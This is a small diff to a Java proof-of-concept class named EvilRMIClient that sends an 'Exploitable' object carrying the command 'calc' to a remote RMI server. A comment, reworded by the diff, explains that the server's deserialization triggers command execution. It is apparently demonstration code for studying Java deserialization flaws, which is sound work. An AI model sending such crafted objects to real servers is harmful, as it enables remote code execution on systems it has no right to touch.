@@ -19,8 +19,9 @@ public class EvilRMIClient {
         Exploitable poc = new Exploitable();
         poc.setParam("calc");
         /**
-         * When we call remote method, the remote server will try to deserialize the Exploitable object
-         * and the readObject() was called, leading the command to be executed.
+         * When we call remote method, the remote server will try to deserialize 
+         * the Exploitable object we passed and the readObject() was called, 
+         * leading the command to be executed.
          */
         rs.doSome(poc);
     }
